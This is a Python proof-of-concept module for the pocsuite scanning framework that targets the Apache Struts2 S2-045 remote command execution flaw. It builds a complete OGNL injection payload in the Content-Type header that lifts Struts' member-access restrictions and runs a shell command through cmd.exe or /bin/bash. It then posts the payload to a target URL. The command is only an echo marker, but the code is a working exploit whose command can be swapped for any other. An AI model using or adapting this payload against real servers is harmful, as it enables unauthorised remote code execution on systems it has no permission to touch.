#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = '00004'
    version = '1.0'
    author = ['jeffzhang']
    vulDate = '2017-09-28'
    createDate = '2017-09-28'
    updateDate = '2017-09-28'
    references = ['']
    name = 'Struts2-045 命令执行漏洞'
    appPowerLink = 'http://www.phpMyAdmin.com/'
    appName = 'Apache Struts'
    appVersion = '<=2.3.32'
    vulType = 'RCE'
    desc = '''
    程攻击者可通过发送恶意的数据包在受影响服务器上执行任意命令
    '''
    samples = ['']

    def _attack(self):
        return self._verify()

    def _verify(self):
        result = {}
        command = "echo 89aifh76ftq4fu38yfq498yf"
        payload = "Content-Type:%{(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?"
        payload += "(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += "(#cmd='%s')." % command
        payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        payload += "(#ros.flush())}"
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}

        response = req.post(self.url, headers=headers)
        if "89aifh76ftq4fu38yfq498yf" in response.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = response.url
        return self.parse_output(result)

    def parse_output(self, result):
        # parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
